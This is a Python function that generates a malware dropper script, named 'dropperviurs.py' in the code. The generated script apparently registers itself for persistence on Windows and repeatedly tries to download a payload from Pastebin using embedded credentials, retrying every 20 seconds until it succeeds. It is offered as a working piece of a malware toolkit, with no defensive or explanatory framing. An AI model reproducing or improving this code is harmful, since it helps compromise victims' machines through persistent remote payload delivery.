def build_dropper(key , username, Password,iD):
	with open("dropperviurs.py","w+") as file:
		file.write("from modules_version2.pastebintester import Mainfun\n")
		file.write("from time import sleep\n")
		file.write("""
def run():
	if __name__ == "__main__":
		while 1:
			try:
	""")
		file.write(""" 
				PassW = Mainfun()
				PassW.reg_windows()
				""")
		file.write(""+"PassW.downloadpaste("+"'"+key + "'" +',' + "'" + username + "'" + ','+ "'" + Password + "'" +","+"'"+iD+"'"+")" + "\n")
		file.write("				"+"break")
		file.write("""
			except Exception:
				sleep(20)
	""")
		file.write(""" 
run()
	""")
		file.close()